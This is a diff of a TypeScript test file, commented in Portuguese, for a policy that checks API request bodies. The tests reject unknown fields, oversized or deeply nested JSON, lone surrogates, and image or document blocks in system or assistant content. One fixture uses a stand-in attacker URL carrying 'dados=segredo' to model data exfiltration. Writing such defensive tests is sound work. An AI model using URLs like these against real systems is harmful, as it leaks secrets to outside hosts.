@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
+import { z } from 'zod';
 import { BRAIN_KEY_PLACEHOLDER, MAX_API_BODY_BYTES } from '../../bridge/brain-protocol';
-import { API_URL, checkApiRequest, MAX_OUTPUT_TOKENS } from './api-policy';
+import { API_URL, checkApiRequest, checkedArray, MAX_JSON_DEPTH, MAX_JSON_NODES, MAX_OUTPUT_TOKENS } from './api-policy';
 import type { ApiRequestInput } from './api-policy';
 
 const TOOLS = { toolNames: ['file_read'] };
@@ -75,12 +76,15 @@ describe('checkApiRequest: o que passa', () => {
     const result = checkApiRequest(input, TOOLS);
     expect(result.ok).toBe(true);
     if (!result.ok) return;
-    expect(result.request.body).toBe(JSON.stringify(aiSdkBody()));
+    // Sai o que foi conferido, inteiro (sem espaços, com as chaves na ordem do esquema).
+    expect(JSON.parse(result.request.body)).toEqual(aiSdkBody());
+    expect(result.request.body).not.toContain('\n');
     expect(result.request.bodyBytes).toBe(Buffer.byteLength(result.request.body));
     expect(result.request.betas).toEqual(['mid-conversation-system-2026-04-07', 'structured-outputs-2025-11-13']);
     expect(result.request.maxTokens).toBe(4096);
     expect(result.request.messages).toBe(4);
     expect(result.request.tools).toBe(1);
+    expect(result.request.thinkingBlocks).toBe(1);
   });
 
   it('aceita o pedido mínimo, sem betas nem chave de mentira', () => {
@@ -231,6 +235,121 @@ describe('checkApiRequest: corpo', () => {
     expect(refusal(withBody((b) => (b['thinking'] = { type: 'enabled', budget_tokens: 2048 })))).toBe('body');
     expect(refusal(withBody((b) => (b['output_config'] = { effort: 'max' })))).toBe('body');
     expect(refusal(withBody((b) => (b['tool_choice'] = { type: 'tool', name: 'file_read' })))).toBe('body');
+  });
+
+  /** Caminhos de cada objeto do corpo do AI SDK: um campo desconhecido em qualquer nível é recusado. */
+  type Json = Record<string, unknown>;
+  const at = (body: Json, path: (string | number)[]): Json => path.reduce<unknown>((node, key) => (node as Json)[key], body) as Json;
+  it.each([
+    ['raiz', []],
+    ['mensagem do usuário', ['messages', 0]],
+    ['mensagem do assistente', ['messages', 1]],
+    ['mensagem de sistema', ['messages', 3]],
+    ['bloco de texto', ['messages', 0, 'content', 0]],
+    ['bloco de raciocínio', ['messages', 1, 'content', 0]],
+    ['chamada de ferramenta', ['messages', 1, 'content', 2]],
+    ['resultado de ferramenta', ['messages', 2, 'content', 0]],
+    ['texto dentro do resultado', ['messages', 2, 'content', 0, 'content', 0]],
+    ['texto da mensagem de sistema', ['messages', 3, 'content', 0]],
+    ['texto do sistema', ['system', 0]],
+    ['cache_control', ['system', 0, 'cache_control']],
+    ['thinking', ['thinking']],
+    ['output_config', ['output_config']],
+    ['tool_choice', ['tool_choice']],
+    ['ferramenta', ['tools', 0]],
+  ] as [string, (string | number)[]][])('recusa campo desconhecido em: %s', (_name, path) => {
+    expect(refusal(withBody((b) => (at(b, path)['campo_novo'] = 'x')))).toBe('body');
+  });
+
+  it('recusa campo desconhecido no raciocínio omitido (redacted_thinking)', () => {
+    const redacted = { type: 'redacted_thinking', data: 'cifrado' };
+    const content = (b: Json) => at(b, ['messages', 1, 'content']) as unknown as Json[];
+    expect(refusal(withBody((b) => content(b).unshift(redacted)))).toBeNull();
+    // Os dois tipos de raciocínio devolvido contam para a reserva.
+    expect(checkApiRequest(withBody((b) => content(b).unshift(redacted)), TOOLS)).toMatchObject({ ok: true, request: { thinkingBlocks: 2 } });
+    expect(refusal(withBody((b) => content(b).unshift({ ...redacted, extra: 1 })))).toBe('body');
+  });
+
+  it('recusa imagem e documento também no sistema e na resposta do assistente', () => {
+    const image = { type: 'image', source: { type: 'url', url: 'https://atacante.example/?dados=segredo' } };
+    const document = { type: 'document', source: { type: 'url', url: 'https://atacante.example/a.pdf' } };
+    for (const block of [image, document]) {
+      expect(refusal(withBody((b) => (b['system'] = [block])))).toBe('body');
+      expect(refusal(withBody((b) => (b['messages'] = [{ role: 'system', content: [block] }])))).toBe('body');
+      expect(refusal(withBody((b) => (b['messages'] = [{ role: 'user', content: 'oi' }, { role: 'assistant', content: [block] }])))).toBe('body');
+    }
+  });
+
+  it('corpo de 2 MB cheio de elementos inválidos: recusado sem prender o principal', () => {
+    const filler = (item: string) => `[${Array.from({ length: Math.floor((MAX_API_BODY_BYTES - 400) / (item.length + 1)) }, () => item).join(',')}]`;
+    const base = '"model":"claude-haiku-5-5","max_tokens":10,"stream":true';
+    const bodies = [
+      `{${base},"messages":[{"role":"user","content":"x"}],"tools":${filler('{}')}}`,
+      `{${base},"messages":${filler('{}')}}`,
+      `{${base},"messages":[{"role":"user","content":${filler('{}')}}]}`,
+      `{${base},"system":${filler('1')},"messages":[{"role":"user","content":"x"}]}`,
+      `{${base},"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":${filler('{}')}}]}]}`,
+    ];
+    for (const body of bodies) {
+      expect(Buffer.byteLength(body)).toBeLessThanOrEqual(MAX_API_BODY_BYTES);
+      const started = performance.now();
+      expect(checkApiRequest(request({ body }), TOOLS)).toMatchObject({ ok: false, refusal: 'json', detail: 'valores demais' });
+      // Sem os limites, cada um levava de 1 a 8 s (e mais de 1 GB de memória); hoje, o grosso é o JSON.parse.
+      expect(performance.now() - started).toBeLessThan(2_000);
+    }
+    // Abaixo do limite de valores, a lista é medida antes dos elementos.
+    const tools = `{${base},"messages":[{"role":"user","content":"x"}],"tools":[${Array.from({ length: 100_000 }, () => '{}').join(',')}]}`;
+    expect(checkApiRequest(request({ body: tools }), TOOLS)).toMatchObject({ ok: false, refusal: 'body', detail: 'tools: too_big' });
+    const messages = `{${base},"messages":[${Array.from({ length: 100_000 }, () => '{}').join(',')}]}`;
+    expect(checkApiRequest(request({ body: messages }), TOOLS)).toMatchObject({ ok: false, refusal: 'body', detail: 'messages: too_big' });
+  });
+
+  it('cada lista é medida antes dos elementos, e os elementos param no primeiro erro', () => {
+    let checked = 0;
+    const counting = z.custom<string>((value) => {
+      checked += 1;
+      return typeof value === 'string';
+    });
+    const list = checkedArray(counting, { min: 1, max: 5 });
+    expect(list.safeParse(['a', 'b']).data).toEqual(['a', 'b']);
+    checked = 0;
+    const bad = list.safeParse(['a', 1, 2, 3]);
+    expect(checked).toBe(2);
+    expect(bad.error?.issues.map((issue) => [issue.code, issue.path])).toEqual([['custom', [1]]]);
+    checked = 0;
+    expect(list.safeParse(['a', 'b', 'c', 'd', 'e', 'f']).error?.issues[0]?.code).toBe('too_big');
+    expect(list.safeParse([]).error?.issues[0]?.code).toBe('too_small');
+    expect(list.safeParse('a').error?.issues[0]?.code).toBe('invalid_type');
+    expect(checked).toBe(0);
+  });
+
+  it('recusa corpo com valores demais; um pedido grande de verdade passa', () => {
+    const many = `{"model":"claude-haiku-5-5","max_tokens":10,"stream":true,"messages":[{"role":"user","content":"x"}],"tools":[{"name":"file_read","description":"x","input_schema":{"a":[${Array.from({ length: MAX_JSON_NODES }, () => '0').join(',')}]}}]}`;
+    expect(checkApiRequest(request({ body: many }), TOOLS)).toMatchObject({ ok: false, refusal: 'json', detail: 'valores demais' });
+    // 2 MB de conversa: 10 mil mensagens de texto.
+    const big = { model: 'claude-haiku-5-5', max_tokens: 10, stream: true, messages: Array.from({ length: 9_999 }, () => ({ role: 'user', content: 'a'.repeat(180) })) };
+    expect(refusal(request({ bodyObject: big }))).toBeNull();
+  });
+
+  it('recusa aninhamento fundo demais, sem estourar a pilha', () => {
+    // Montado como texto: o próprio JSON.stringify do teste estouraria a pilha.
+    const nested = (levels: number) => `${'['.repeat(levels)}${']'.repeat(levels)}`;
+    const withInput = (value: string) => request({ body: JSON.stringify(aiSdkBody()).replace('"input":{"path":"a.txt"}', `"input":{"a":${value}}`) });
+    for (const levels of [MAX_JSON_DEPTH, 5_000, 100_000]) {
+      expect(checkApiRequest(withInput(nested(levels)), TOOLS)).toMatchObject({ ok: false, refusal: 'json', detail: 'aninhamento fundo demais' });
+    }
+    const schema = JSON.stringify(aiSdkBody()).replace('"input_schema":{', `"input_schema":{"x":${nested(10_000)},`);
+    expect(refusal(request({ body: schema }))).toBe('json');
+    // O que um esquema de verdade usa passa.
+    expect(refusal(withInput(nested(20)))).toBeNull();
+  });
+
+  it('recusa texto com metade de um par de surrogates solta (sairia com o dobro do tamanho medido)', () => {
+    const lone = String.fromCharCode(0xd800);
+    const body = JSON.stringify(aiSdkBody()).replace('"Oi"', `"${lone.repeat(10)}"`);
+    expect(checkApiRequest(request({ body }), TOOLS)).toMatchObject({ ok: false, refusal: 'json' });
+    // O par inteiro (emoji) passa.
+    expect(refusal(request({ body: JSON.stringify(aiSdkBody()).replace('"Oi"', '"Oi \ud83d\ude00 😀"') }))).toBeNull();
   });
 
   it('o detalhe da recusa diz onde e o quê, sem o conteúdo', () => {
